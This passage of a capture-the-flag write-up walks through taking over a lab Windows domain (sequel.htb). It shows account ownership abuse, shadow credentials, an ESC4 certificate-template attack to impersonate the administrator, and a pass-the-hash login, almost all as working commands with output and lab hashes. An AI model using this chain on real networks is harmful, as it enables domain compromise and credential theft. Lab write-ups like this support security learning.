Since i have working creds for ryan I collected bloodhound loot to further analyze
```sh
❯ nxc ldap 10.129.10.28 -u rose -p 'KxEPkKe6R8su' --bloodhound --collection All --dns-server 10.129.10.28 -d sequel.htb  
LDAP        10.129.10.28    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.10.28    389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su    
LDAP        10.129.10.28    389    DC01             Resolved collection methods: acl, dcom, session, localadmin, group, objectprops, rdp, trusts, psremote, container  
[21:13:47] ERROR    Unhandled exception in computer DC01.sequel.htb processing: The NETBIOS connection with the remote host timed out.                                                                                       computers.py:268  
LDAP        10.129.10.28    389    DC01             Done in 0M 58S  
LDAP        10.129.10.28    389    DC01             Compressing output into /home/kevin/.nxc/logs/DC01_10.129.10.28_2026-06-05_211245_bloodhound.zip  
❯ cp /home/kevin/.nxc/logs/DC01_10.129.10.28_2026-06-05_211245_bloodhound.zip .
```
From bloodhound we notice that 
Ryan has `WriteOwner` outbound object control  on  `CA_SVC` user which is a member of cert publishers
![bloodhound](attachment:bloodhound.png)

## Taking ownsership of CA_SVC
We can take ownership of the `CA_SVC` user account from using bloodyad
1. 
```powershell
❯ bloodyAD --host 10.129.10.28 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan  
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```
Now that we have ownershiip we can grant ourselves GenericAll over ca_svc
```sh
❯ bloodyAD --host 10.129.10.28 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan  
[+] ryan has now GenericAll on ca_svc
```
Add Shadow Credentials to ca_svc
```sh
❯ bloodyAD --host 10.129.10.28 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add shadowCredentials ca_svc  
[+] KeyCredential generated with following sha256 of RSA key: 3aeac714d4bf2c83ec34514f44d8e500c35143e346242971539e14f6e8d686cb  
[+] TGT stored in ccache file ca_svc_j4.ccache  
  
NT: 3b181b914e7a9d5508ea1e20bc2b7fce
```
We NT hash for ca_svc now we find vulnerable templates
```sh
❯ certipy find -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.10.28 -vuln -stdout  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 15 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'  
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
 0  
   CA Name                             : sequel-DC01-CA  
   DNS Name                            : DC01.sequel.htb  
   Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb  
   Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3  
   Certificate Validity Start          : 2024-06-08 16:50:40+00:00  
   Certificate Validity End            : 2124-06-08 17:00:40+00:00  
   Web Enrollment  
     HTTP  
       Enabled                         : False  
     HTTPS  
       Enabled                         : False  
   User Specified SAN                  : Disabled  
   Request Disposition                 : Issue  
   Enforce Encryption for Requests     : Enabled  
   Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy  
   Permissions  
     Owner                             : SEQUEL.HTB\Administrators  
     Access Rights  
       ManageCa                        : SEQUEL.HTB\Administrators  
                                         SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       ManageCertificates              : SEQUEL.HTB\Administrators  
                                         SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       Enroll                          : SEQUEL.HTB\Authenticated Users  
Certificate Templates  
 0  
   Template Name                       : DunderMifflinAuthentication  
   Display Name                        : Dunder Mifflin Authentication  
   Certificate Authorities             : sequel-DC01-CA  
   Enabled                             : True  
   Client Authentication               : True  
   Enrollment Agent                    : False  
   Any Purpose                         : False  
   Enrollee Supplies Subject           : False  
   Certificate Name Flag               : SubjectAltRequireDns  
                                         SubjectRequireCommonName  
   Enrollment Flag                     : PublishToDs  
                                         AutoEnrollment  
   Extended Key Usage                  : Client Authentication  
                                         Server Authentication  
   Requires Manager Approval           : False  
   Requires Key Archival               : False  
   Authorized Signatures Required      : 0  
   Schema Version                      : 2  
   Validity Period                     : 1000 years  
   Renewal Period                      : 6 weeks  
   Minimum RSA Key Length              : 2048  
   Template Created                    : 2026-06-05T19:25:28+00:00  
   Template Last Modified              : 2026-06-05T19:25:28+00:00  
   Permissions  
     Enrollment Permissions  
       Enrollment Rights               : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
     Object Control Permissions  
       Owner                           : SEQUEL.HTB\Enterprise Admins  
       Full Control Principals         : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
                                         SEQUEL.HTB\Cert Publishers  
       Write Owner Principals          : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
                                         SEQUEL.HTB\Cert Publishers  
       Write Dacl Principals           : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
                                         SEQUEL.HTB\Cert Publishers  
       Write Property Enroll           : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
   [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers  
   [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers  
   [!] Vulnerabilities  
     ESC4                              : User has dangerous permissions.
```
We can see that the template `DunderMifflinAuthentication` is vulnerable 

## ESC4 
Modifying the certificate template
```sh
❯ certipy template -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.10.28 -template DunderMifflinAuthentication -write-default-configuration  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Saving current configuration to 'DunderMifflinAuthentication.json'  
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'  
[*] Updating certificate template 'DunderMifflinAuthentication'  
[*] Replacing:  
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00  
\x00\x00\x00\x05\x0b\x00\x00\x00'  
[*]     flags: 66104  
[*]     pKIDefaultKeySpec: 2  
[*]     pKIKeyUsage: b'\x86\x00'  
[*]     pKIMaxIssuingDepth: -1  
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']  
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'  
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']  
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']  
[*]     msPKI-Enrollment-Flag: 0  
[*]     msPKI-Private-Key-Flag: 16  
[*]     msPKI-Certificate-Name-Flag: 1  
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']  
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y  
[*] Successfully updated 'DunderMifflinAuthentication'  

```
Requesting certificate via RPC
```sh
❯ certipy req -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.10.28 -ca sequel-DC01-CA -template DunderMifflinAuthentication -target DC01.sequel.htb -upn administrator@sequel.htb  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 8  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@sequel.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
```
now that we get a pfx certificate file, we can request the domain admin TGT Ticket or the administrator hash to gain access to the domain controller.
```sh
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.10.28  
  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator@sequel.htb'  
[*] Using principal: 'administrator@sequel.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

## Administrator

Now that we have the administrator hash we can login
```powershell
❯ evil-winrm -i 10.129.10.28 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami  
sequel\administrator  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt  
626e3bffd9a9afbf21e5f6342f7bba2b
```

We get the roof flag
